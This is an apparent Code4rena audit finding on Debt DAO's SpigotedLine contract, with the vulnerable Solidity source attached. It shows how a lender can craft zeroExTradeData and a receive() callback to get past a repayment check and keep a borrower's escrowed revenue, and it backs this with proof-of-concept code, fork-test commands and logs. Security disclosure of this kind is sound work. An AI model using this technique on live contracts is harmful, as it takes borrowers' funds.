{
  "Title": "[M-04] Lender can trade claimToken in a malicious way to steal the borrowerâ€™s money via claimAndRepay() in SpigotedLine by using malicious zeroExTradeData",
  "Content": "# Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol#L106-L112\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol#L75-L85\n\n\n# Vulnerability details\n\n## Impact\n\nLender can trade claimToken in a malicious way to steal the borrower's money via claimAndRepay() in SpigotedLine by using malicious zeroExTradeData.\n\nIn the design of the protocol, the lender can use the function claimAndRepay(), the lender can take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit. \n\n```\nfunction claimAndRepay(address claimToken, bytes calldata zeroExTradeData) external\n        whileBorrowing\n        nonReentrant\n        returns (uint256) { \n\n...\n// Line 106 - Line 112\nuint256 newTokens = claimToken == credit.token ?\n          spigot.claimEscrow(claimToken) :  // same asset. dont trade\n          _claimAndTrade(                   // trade revenue token for debt obligation\n              claimToken,\n              credit.token,\n              zeroExTradeData\n          );\n...\n// Line 128 - Line 130 \n credits[id] = _repay(credit, id, repaid);\n\n        emit RevenuePayment(claimToken, repaid);\n\n...\n\n}\n\n```\n\n```\nfunction _claimAndTrade(\n      address claimToken,\n      address targetToken,\n      bytes calldata zeroExTradeData\n    )\n        internal\n        returns (uint256)\n    {\n        (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(\n            claimToken,\n            targetToken,\n            swapTarget,\n            address(spigot),\n            unusedTokens[claimToken],\n            zeroExTradeData\n        );\n\n        // we dont use revenue after this so can store now\n        unusedTokens[claimToken] = totalUnused;\n        return tokensBought;\n    }\n```\n```\nfunction claimAndTrade(\n        address claimToken,\n        address targetToken,\n        address payable swapTarget,\n        address spigot,\n        uint256 unused,\n        bytes calldata zeroExTradeData\n    )\n    external \n        returns(uint256, uint256)\n\n{\n...\n trade(\n            claimed + unused,\n            claimToken,\n            swapTarget,\n            zeroExTradeData\n        );\n        \n        // underflow revert ensures we have more tokens than we started with\n        uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;\n\n        if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought\n...\n\n\n}\n\n```\n\nIn the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert. \n\nThe bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.\n\n## Proof of Concept\n\nThe following code can manipulate and bypass the check to steal money of the borrower.\nStep 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract. \nStep 2: In the exploit contract, have the receive() function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit. \n\n```\nreceive() external payable {\n    console.log(\"Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance\");\n    uint256 amount = 100; \n    creditToken.transfer(address(line),amount);\n    console.log(\"Receive the amount of ETH: %s\", msg.value);\n  }\n\n```\nIn the receive() function, the exploit contract transfer some amount of creditToken to the SpigotedLine contract to bypass the check \n```\n if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought\n```\nSince this check requires only not 0, so the lender can send only 1 or very small amount, e.g. 100 of creditToken. \n\nThis amount then will be used to repay the credit. \nSo this means, the borrower lost money, because the lender can claim big amount of claimToken and repay a little for the credit.\n\nIn the zip file in the Google_Drive link, there is the POC written for this bug. \nThe test case is test_lender_can_claim_and_repay_3 in file SpigotedLine.t.modified.sol \nYou can put this file to the tests folder\nhttps://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing\n\nYou can run the POC by calling: \n```\nforge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n\number 15918000\n```\nHere I use the block-number to make the test log stable, but this does not impact the logic of POC. \n\nYou can find the detailed log file: Line-of-Credit\\test_claim_221107_2311.log\nThe full log file here: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing \nIn this log file, the lender claims 1000 DAI (DAI is revenueToken) then sell to receive 0.6324 ETH, but repays only 100 * ( 10 ** -18 ) BUSD for the borrower. \n\nLogs:\n  Step 0: As a Borrower borrow some money \n  Step 1: Construct the tradeData to call claimAndRepay as the lender\n  claimed: 1000000000000000000000\n  unused: 0\n  sellAmount: 1000000000000000000000\n  Step 1: As the lender, call claimAndRepay with Malicious zeroExTradeData\n  Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance\n  Receive the amount of ETH: 632428006785336734\n  emit RepayInterest(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 0)\n  emit RepayPrincipal(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 100)\n  RevenuePayment(token: DAI: [0x6b175474e89094c44da98b954eedeac495271d0f], amount: 100)\n\nYou can use the POC.patch here: https://drive.google.com/file/d/17Ycdi5czBoFOKNQlgVqWxVdHxfw04304/view?usp=sharing \nTo use it use command \n```\ngit apply POC.patch\n\n```\n\nTo run use command \n```\nforge install\nforge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n\number 15918000\n\n```\n\nThe full code repository: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing \n\n## Tools Used\nFoundry\n\n## Recommended Mitigation Steps\n\nThis is a difficult bug to fix if the protocol still allows the lender to use this functionality. Probably should limit this functionality for the borrower to use. Because the borrower will not benefit from stealing his own money.",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-11-debt-dao-contest",
  "Code": [
    {
      "filename": "code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol",
      "content": "pragma solidity ^0.8.9;\n\nimport { Denominations } from \"chainlink/Denominations.sol\";\nimport { ReentrancyGuard } from \"openzeppelin/security/ReentrancyGuard.sol\";\nimport {LineOfCredit} from \"./LineOfCredit.sol\";\nimport {LineLib} from \"../../utils/LineLib.sol\";\nimport {CreditLib} from \"../../utils/CreditLib.sol\";\nimport {SpigotedLineLib} from \"../../utils/SpigotedLineLib.sol\";\nimport {MutualConsent} from \"../../utils/MutualConsent.sol\";\nimport {ISpigot} from \"../../interfaces/ISpigot.sol\";\nimport {ISpigotedLine} from \"../../interfaces/ISpigotedLine.sol\";\nimport { IERC20 } from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {SafeERC20}  from \"openzeppelin/token/ERC20/utils/SafeERC20.sol\";\n\n/**\n  * @title  - Debt DAO Spigoted Line of Credit\n  * @author - Kiba Gateaux\n  * @notice - The SpigotedLine is a LineofCredit contract with additional functionality for integrating with a Spigot.\n            - allows Borrower or Lender to repay debt using collateralized revenue streams\n  * @dev    -  Inherits LineOfCredit functionality\n */\ncontract SpigotedLine is ISpigotedLine, LineOfCredit, ReentrancyGuard {\n    using SafeERC20 for IERC20;\n\n    /// see Spigot\n    ISpigot public immutable spigot;\n\n    /// @notice exchange aggregator (mainly 0x router) to trade revenue tokens from a Spigot for credit tokens owed to lenders\n    address payable public immutable swapTarget;\n\n    /// @notice % of revenue tokens to take from Spigot if the Line of Credit  is healthy. 0 decimals\n    uint8 public immutable defaultRevenueSplit;\n\n\n    /**\n     * @notice - excess unsold revenue claimed from Spigot to be sold later or excess credit tokens bought from revenue but not yet used to repay debt\n     *         - needed because the Line of Credit might have the same token being lent/borrower as being bought/sold so need to separate accounting. \n     * @dev    - private variable so other Line modules do not interfer with Spigot functionality\n    */\n    mapping(address => uint256) private unusedTokens;\n\n    /**\n     * @notice - The SpigotedLine is a LineofCredit contract with additional functionality for integrating with a Spigot.\n               - allows Borrower or Lender to repay debt using collateralized revenue streams\n     * @param oracle_ - price oracle to use for getting all token values\n     * @param arbiter_ - neutral party with some special priviliges on behalf of borrower and lender\n     * @param borrower_ - the debitor for all credit positions in this contract\n     * @param spigot_ - Spigot smart contract that is owned by this Line\n     * @param swapTarget_ - 0x protocol exchange address to send calldata for trades to exchange revenue tokens for credit tokens\n     * @param ttl_ - time to live for line of credit contract across all lenders set at deployment in order to set the term/expiry date\n     * @param defaultRevenueSplit_ - The % of Revenue Tokens that the Spigot escrows for debt repayment if the Line is healthy. \n     */\n    constructor(\n        address oracle_,\n        address arbiter_,\n        address borrower_,\n        address spigot_,\n        address payable swapTarget_,\n        uint256 ttl_,\n        uint8 defaultRevenueSplit_\n    ) LineOfCredit(oracle_, arbiter_, borrower_, ttl_) {\n        require(defaultRevenueSplit_ <= SpigotedLineLib.MAX_SPLIT);\n\n        spigot = ISpigot(spigot_);\n        defaultRevenueSplit = defaultRevenueSplit_;\n        swapTarget = swapTarget_;\n    }\n\n    /**\n    * see LineOfCredit._init and Securedline.init\n    * @notice requires this Line is owner of the Escrowed collateral else Line will not init\n    */\n    function _init() internal virtual override(LineOfCredit) returns(LineLib.STATUS) {\n      if(spigot.owner() != address(this)) return LineLib.STATUS.UNINITIALIZED;\n      return LineOfCredit._init();\n    }\n\n    function unused(address token) external view returns (uint256) {\n        return unusedTokens[token];\n    }\n\n    /**\n      * see SecuredLine.declareInsolvent\n      * @notice requires Spigot contract itselgf to be transfered to Arbiter and sold off to a 3rd party before declaring insolvent\n      *(@dev priviliegad internal function.\n      * @return isInsolvent - if Spigot contract is currently insolvent or not\n    */\n    function _canDeclareInsolvent() internal virtual override returns(bool) {\n        return SpigotedLineLib.canDeclareInsolvent(address(spigot), arbiter);\n    }\n\n    /// see ISpigotedLine.claimAndRepay\n    function claimAndRepay(address claimToken, bytes calldata zeroExTradeData)\n        external\n        whileBorrowing\n        nonReentrant\n        returns (uint256)\n    {\n        bytes32 id = ids[0];\n        Credit memory credit = _accrue(credits[id], id);\n\n        if (msg.sender != borrower && msg.sender != credit.lender) {\n            revert CallerAccessDenied();\n        }\n\n        uint256 newTokens = claimToken == credit.token ?\n          spigot.claimEscrow(claimToken) :  // same asset. dont trade\n          _claimAndTrade(                   // trade revenue token for debt obligation\n              claimToken,\n              credit.token,\n              zeroExTradeData\n          );\n\n        uint256 repaid = newTokens + unusedTokens[credit.token];\n        uint256 debt = credit.interestAccrued + credit.principal;\n\n        // cap payment to debt value\n        if (repaid > debt) repaid = debt;\n        // update unused amount based on usage\n        if (repaid > newTokens) {\n            // using bought + unused to repay line\n            unusedTokens[credit.token] -= repaid - newTokens;\n        } else {\n            // high revenue and bought more than we need\n            unusedTokens[credit.token] += newTokens - repaid;\n        }\n\n        credits[id] = _repay(credit, id, repaid);\n\n        emit RevenuePayment(claimToken, repaid);\n\n        return newTokens;\n    }\n    \n\n    /// see ISpigotedLine.useAndRepay\n    function useAndRepay(uint256 amount) external whileBorrowing returns(bool) {\n      bytes32 id = ids[0];\n      Credit memory credit = credits[id];\n      if (msg.sender != borrower && msg.sender != credit.lender) {\n        revert CallerAccessDenied();\n      }\n      require(amount <= unusedTokens[credit.token]);\n      unusedTokens[credit.token] -= amount;\n\n      credits[id] = _repay(_accrue(credit, id), id, amount);\n\n      emit RevenuePayment(credit.token, amount);\n\n      return true;\n    }\n\n    /// see ISpigotedLine.claimAndTrade\n    function claimAndTrade(address claimToken, bytes calldata zeroExTradeData)\n        external\n        whileBorrowing\n        nonReentrant\n        returns (uint256)\n    {\n        require(msg.sender == borrower);\n\n        address targetToken = credits[ids[0]].token;\n        uint256 newTokens = claimToken == targetToken ?\n          spigot.claimEscrow(claimToken) : // same asset. dont trade\n          _claimAndTrade(                   // trade revenue token for debt obligation\n              claimToken,\n              targetToken,\n              zeroExTradeData\n          );\n\n        // add bought tokens to unused balance\n        unusedTokens[targetToken] += newTokens;\n        return newTokens;\n    }\n\n    /**\n     * @notice  - Claims revenue tokens escrowed in Spigot and trades them for credit tokens. \n     *          - MUST trade all available claim tokens to target credit token.\n     *          - Excess credit tokens not used to repay dent are stored in `unused`\n     * @dev     - priviliged internal function\n     * @param claimToken - The revenue token escrowed in the Spigot to sell in trade\n     * @param targetToken - The credit token that needs to be bought in order to pat down debt. Always `credits[ids[0]].token`\n     * @param zeroExTradeData - 0x API data to use in trade to sell `claimToken` for target\n     *\n     * @return - amount of target tokens bought\n    */\n    function _claimAndTrade(\n      address claimToken,\n      address targetToken,\n      bytes calldata zeroExTradeData\n    )\n        internal\n        returns (uint256)\n    {\n        (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(\n            claimToken,\n            targetToken,\n            swapTarget,\n            address(spigot),\n            unusedTokens[claimToken],\n            zeroExTradeData\n        );\n\n        // we dont use revenue after this so can store now\n        unusedTokens[claimToken] = totalUnused;\n        return tokensBought;\n    }\n\n\n    //  SPIGOT OWNER FUNCTIONS\n\n    /// see ISpigotedLine.updateOwnerSplit\n    function updateOwnerSplit(address revenueContract) external returns (bool) {\n        return SpigotedLineLib.updateSplit(\n          address(spigot),\n          revenueContract,\n          _updateStatus(_healthcheck()),\n          defaultRevenueSplit\n        );\n    }\n\n    /// see ISpigotedLine.addSpigot\n    function addSpigot(\n        address revenueContract,\n        ISpigot.Setting calldata setting\n    )\n        external\n        mutualConsent(arbiter, borrower)\n        returns (bool)\n    {\n        return spigot.addSpigot(revenueContract, setting);\n    }\n\n    /// see ISpigotedLine.updateWhitelist\n    function updateWhitelist(bytes4 func, bool allowed)\n        external\n        returns (bool)\n    {\n        require(msg.sender == arbiter);\n        return spigot.updateWhitelistedFunction(func, allowed);\n    }\n\n    /// see ISpigotedLine.releaseSpigot\n    function releaseSpigot(address to) external returns (bool) {\n        return SpigotedLineLib.releaseSpigot(\n          address(spigot),\n          _updateStatus(_healthcheck()),\n          borrower,\n          arbiter,\n          to\n        );\n    }\n\n    /// see ISpigotedLine.sweep\n    function sweep(address to, address token) external nonReentrant returns (uint256) {\n        uint256 amount = unusedTokens[token];\n        delete unusedTokens[token];\n\n        bool success = SpigotedLineLib.sweep(\n          to,\n          token,\n          amount,\n          _updateStatus(_healthcheck()),\n          borrower,\n          arbiter\n        );\n\n        return success ? amount : 0;\n    }\n\n    // allow claiming/trading in ETH\n    receive() external payable {}\n}"
    },
    {
      "filename": "code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol",
      "content": "pragma solidity 0.8.9;\n\nimport { ISpigot } from \"../interfaces/ISpigot.sol\";\nimport { ISpigotedLine } from \"../interfaces/ISpigotedLine.sol\";\nimport { LineLib } from \"../utils/LineLib.sol\";\nimport { IERC20 } from \"openzeppelin/token/ERC20/IERC20.sol\";\n\nimport { Denominations } from \"chainlink/Denominations.sol\";\n\nlibrary SpigotedLineLib {\n\n    // max revenue to take from Spigot if line is in distress\n    uint8 constant MAX_SPLIT = 100;\n\n    error NoSpigot();\n\n    error TradeFailed();\n\n    error BadTradingPair();\n\n    error CallerAccessDenied();\n    \n    error ReleaseSpigotFailed();\n\n    error NotInsolvent(address module);\n\n    error UsedExcessTokens(address token, uint256 amountAvailable);\n\n\n    event TradeSpigotRevenue(\n        address indexed revenueToken,\n        uint256 revenueTokenAmount,\n        address indexed debtToken,\n        uint256 indexed debtTokensBought\n    );\n\n\n    /**\n     * @notice              Allows revenue tokens in 'escrowed' to be traded for credit tokens that aren't yet used to repay debt. \n                            The newly exchanged credit tokens are held in 'unusedTokens' ready for a Lender to withdraw using useAndRepay \n                            This feature allows a Borrower to take advantage of an increase in the value of the revenue token compared \n                            to the credit token and to in effect use less revenue tokens to be later used to repay the same amount of debt.\n     * @dev                 MUST trade all available claimTokens to targetTokens\n     * @dev                 priviliged internal function\n     * @param claimToken    - The revenue token escrowed in the Spigot to sell in trade\n     * @param targetToken   - The credit token that needs to be bought in order to pat down debt. Always `credits[ids[0]].token`\n     * @param swapTarget    - The 0x exchange router address to call for trades\n     * @param spigot        - The Spigot to claim from. Must be owned by adddress(this)\n     * @param unused        - Current amount of unused claimTokens\n     * @param zeroExTradeData - 0x API data to use in trade to sell `claimToken` for target\n     * @return (uint, uint) - amount of targetTokens bought, total unused claimTokens after trade\n     */\n    function claimAndTrade(\n        address claimToken,\n        address targetToken,\n        address payable swapTarget,\n        address spigot,\n        uint256 unused,\n        bytes calldata zeroExTradeData\n    )\n        external \n        returns(uint256, uint256)\n    {\n        // can't trade into same token. causes double count for unused tokens\n        if(claimToken == targetToken) { revert BadTradingPair(); }\n\n        // snapshot token balances now to diff after trade executes\n        uint256 oldClaimTokens = LineLib.getBalance(claimToken);\n        uint256 oldTargetTokens = LineLib.getBalance(targetToken);\n        \n        // @dev claim has to be called after we get balance\n        // reverts if there are no tokens to claim\n        uint256 claimed = ISpigot(spigot).claimEscrow(claimToken);\n\n        trade(\n            claimed + unused,\n            claimToken,\n            swapTarget,\n            zeroExTradeData\n        );\n        \n        // underflow revert ensures we have more tokens than we started with\n        uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;\n\n        if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought\n\n        uint256 newClaimTokens = LineLib.getBalance(claimToken);\n\n        // ideally we could use oracle to calculate # of tokens to receive\n        // but sellToken might not have oracle. buyToken must have oracle\n\n        emit TradeSpigotRevenue(\n            claimToken,\n            claimed,\n            targetToken,\n            tokensBought\n        );\n\n        // used reserve revenue to repay debt\n        if(oldClaimTokens > newClaimTokens) {\n          uint256 diff = oldClaimTokens - newClaimTokens;\n\n          // used more tokens than we had in revenue reserves.\n          // prevent borrower from pulling idle lender funds to repay other lenders\n          if(diff > unused) revert UsedExcessTokens(claimToken,  unused); \n          // reduce reserves by consumed amount\n          else return (\n            tokensBought,\n            unused - diff\n          );\n        } else { unchecked {\n          // excess revenue in trade. store in reserves\n          return (\n            tokensBought,\n            unused + (newClaimTokens - oldClaimTokens)\n          );\n        } }\n    }\n\n    function trade(\n        uint256 amount,\n        address sellToken,\n        address payable swapTarget,\n        bytes calldata zeroExTradeData\n    ) \n        public\n        returns(bool)\n    {\n        if (sellToken == Denominations.ETH) {\n            // if claiming/trading eth send as msg.value to dex\n            (bool success, ) = swapTarget.call{value: amount}(zeroExTradeData);\n            if(!success) { revert TradeFailed(); }\n        } else {\n            IERC20(sellToken).approve(swapTarget, amount);\n            (bool success, ) = swapTarget.call(zeroExTradeData);\n            if(!success) { revert TradeFailed(); }\n        }\n\n        return true;\n    }\n\n    /**\n     * @notice cleanup function when a Line of Credit facility has expired.\n        Used in the event that we want to reuse a Spigot instead of starting from scratch\n     */\n    function rollover(address spigot, address newLine) external returns(bool) {\n      require(ISpigot(spigot).updateOwner(newLine));\n      return true;\n    }\n\n    function canDeclareInsolvent(address spigot, address arbiter) external view returns (bool) {\n            // Must have called releaseSpigot() and sold off protocol / revenue streams already\n      address owner_ = ISpigot(spigot).owner();\n      if(\n        address(this) == owner_ ||\n        arbiter == owner_\n      ) { revert NotInsolvent(spigot); }\n      // no additional logic in LineOfCredit to include\n      return true;\n    }\n\n\n    /**\n     * @notice Changes the revenue split between a Borrower's treasury and the LineOfCredit based on line health, runs with updateOwnerSplit()\n     * @dev    - callable `arbiter` + `borrower`\n     * @param revenueContract - spigot to update\n     * @return whether or not split was updated\n     */\n    function updateSplit(address spigot, address revenueContract, LineLib.STATUS status, uint8 defaultSplit) external returns (bool) {\n        (uint8 split,, bytes4 transferFunc) = ISpigot(spigot).getSetting(revenueContract);\n\n        if(transferFunc == bytes4(0)) { revert NoSpigot(); }\n\n        if(status == LineLib.STATUS.ACTIVE && split != defaultSplit) {\n            // if Line of Credit is healthy then set the split to the prior agreed default split of revenue tokens\n            return ISpigot(spigot).updateOwnerSplit(revenueContract, defaultSplit);\n        } else if (status == LineLib.STATUS.LIQUIDATABLE && split != MAX_SPLIT) {\n            // if the Line of Credit is in distress then take all revenue to repay debt\n            return ISpigot(spigot).updateOwnerSplit(revenueContract, MAX_SPLIT);\n        }\n\n        return false;\n    }\n\n\n    /**\n\n   * @notice -  Transfers ownership of the entire Spigot and its revenuw streams from its then Owner to either \n                the Borrower (if a Line of Credit has been been fully repaid) or \n                to the Arbiter (if the Line of Credit is liquidatable).\n   * @dev    - callable by anyone \n   * @return - whether or not Spigot was released\n  */\n    function releaseSpigot(address spigot, LineLib.STATUS status, address borrower, address arbiter, address to) external returns (bool) {\n        if (status == LineLib.STATUS.REPAID &&  msg.sender == borrower) {\n          if(!ISpigot(spigot).updateOwner(to)) { revert ReleaseSpigotFailed(); }\n          return true;\n        }\n\n        if (status == LineLib.STATUS.LIQUIDATABLE && msg.sender == arbiter) {\n          if(!ISpigot(spigot).updateOwner(to)) { revert ReleaseSpigotFailed(); }\n          return true;\n        }\n\n        revert CallerAccessDenied();\n\n        return false;\n    }\n\n\n  /**\n   * @notice -  Sends any remaining tokens (revenue or credit tokens) in the Spigot to the Borrower after the loan has been repaid.\n             -  In case of a Borrower default (loan status = liquidatable), this is a fallback mechanism to withdraw all the tokens and send them to the Arbiter\n             -  Does not transfer anything if line is healthy\n   * @return - whether or not spigot was released\n  */\n    function sweep(address to, address token, uint256 amount, LineLib.STATUS status, address borrower, address arbiter) external returns (bool) {\n        if(amount == 0) { revert UsedExcessTokens(token, 0); }\n\n        if (status == LineLib.STATUS.REPAID && msg.sender == borrower) {\n            return LineLib.sendOutTokenOrETH(token, to, amount);\n\n        }\n\n        if (\n          (status == LineLib.STATUS.LIQUIDATABLE || status == LineLib.STATUS.INSOLVENT) &&\n          msg.sender == arbiter\n        ) {\n            return LineLib.sendOutTokenOrETH(token, to, amount);\n        }\n\n        revert CallerAccessDenied();\n\n        return false;\n    }\n}"
    }
  ]
}